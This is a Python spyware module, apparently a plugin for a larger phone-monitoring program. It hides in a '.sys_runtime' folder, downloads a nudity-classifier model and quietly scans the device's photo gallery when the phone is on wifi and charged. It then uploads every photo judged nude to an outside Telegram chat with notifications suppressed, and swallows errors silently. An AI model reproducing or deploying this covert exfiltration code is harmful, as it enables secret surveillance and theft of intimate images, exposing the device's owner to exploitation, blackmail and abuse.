# -*- coding: utf-8 -*-
import os, time, threading, logging, random, sqlite3, hashlib, gc, requests
from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")
M = os.path.join(P, ".models")
T = os.path.join(P, "n_tmp")
MODEL_URL = "https://raw.githubusercontent.com/O-Y-S/O-Y-S/main/engine_v2.tflite"

for d in [M, T]:
    if not os.path.exists(d): os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR)

try:
    import numpy as np
    from PIL import Image
    import tflite_runtime.interpreter as tflite
    JNI = True
except:
    JNI = False

class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0
        self.model_path = os.path.join(M, "engine_v2.tflite")
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()
        threading.Thread(target=self._prepare_engine, daemon=True).start()

    def _init_db(self):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                old = int(time.time()) - (30 * 86400)
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old,))
                conn.commit()
        except: pass

    def _prepare_engine(self):
        if not JNI: return
        try:
            if not os.path.exists(self.model_path) or os.path.getsize(self.model_path) < 1000000:
                if hasattr(self.mon, '_is_wifi') and self.mon._is_wifi():
                    r = requests.get(MODEL_URL, timeout=60, stream=True)
                    if r.status_code == 200:
                        with open(self.model_path, 'wb') as f:
                            for chunk in r.iter_content(chunk_size=1024*32):
                                if chunk: f.write(chunk)
            self._load_engine()
        except Exception as e:
            logging.error(f"Prepare engine error: {e}")
            if os.path.exists(self.model_path): os.remove(self.model_path)

    def _load_engine(self):
        try:
            if os.path.exists(self.model_path) and os.path.getsize(self.model_path) > 1000000:
                self.model = tflite.Interpreter(model_path=self.model_path)
                self.model.allocate_tensors()
                self.in_idx = self.model.get_input_details()[0]['index']
                self.out_idx = self.model.get_output_details()[0]['index']
        except: pass

    def _check_power(self, mon):
        try:
            b, c = mon._bat() if hasattr(mon, '_bat') else (100, True)
            wifi = mon._is_wifi() if hasattr(mon, '_is_wifi') else True
            return (c and wifi) or (b >= 80 and wifi)
        except: return False

    def scan(self, mon):
        if self.active or not self.model: return
        if not self._check_power(mon): return
        n = time.time()
        if (n - self.last_run) < 2700: return
        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()

    def _worker(self, mon):
        with self._lock:
            self.active = True
            self.last_run = time.time()
            try:
                sc = getattr(mon, 'media_scanner', None)
                if not sc: return
                items = sc.get_gallery_by_category("pending", limit=20, page=0)
                for item in items:
                    if not self._check_power(mon): break
                    path = item.get("path")
                    label = item.get("label", "??")
                    if not path or not os.path.exists(path): continue
                    h = hashlib.md5(path.encode()).hexdigest()
                    if self._is_cached(h): continue
                    prob = self._analyze(path)
                    if prob > 0.85:
                        sc.update_category(h, "nude", prob)
                        self._report(path, label, mon)
                    elif prob > 0.45:
                        sc.update_category(h, "questionable", prob)
                    else:
                        sc.update_category(h, "normal", prob)
                    self._mark_cached(h)
                    time.sleep(1.5)
            except Exception as e:
                logging.error(f"Worker loop error: {e}")
            finally:
                self.active = False
                gc.collect()

    def _analyze(self, path):
        img = None
        try:
            img = Image.open(path).convert('RGB').resize((224, 224), Image.BILINEAR)
            arr = np.array(img, dtype=np.float32) / 255.0
            arr = np.expand_dims(arr, axis=0)
            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]
            prob = float(out[1]) if len(out) > 1 else float(out[0])
            img.close()
            del img, arr
            return prob
        except Exception as e:
            if img: img.close()
            logging.error(f"Analysis error {os.path.basename(path)}: {e}")
            return 0

    def _is_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                return conn.execute('SELECT 1 FROM scan_logs WHERE h=?', (h,)).fetchone()
        except: return False

    def _mark_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('INSERT OR REPLACE INTO scan_logs VALUES (?, ?)', (h, int(time.time())))
                conn.commit()
        except: pass

    def _report(self, path, label, mon):
        try:
            tg = getattr(mon, 'tg', None)
            vlt = getattr(mon, 'vlt', None)
            if tg and vlt:
                with open(path, 'rb') as f:
                    tg._ap("sendPhoto", {
                        "chat_id": vlt,
                        "caption": f"🔞 #{label} | {datetime.now().strftime('%H:%M')}",
                        "disable_notification": True
                    }, {"photo": f})
        except: pass

def create(mon=None):
    return NudeDetector(mon)
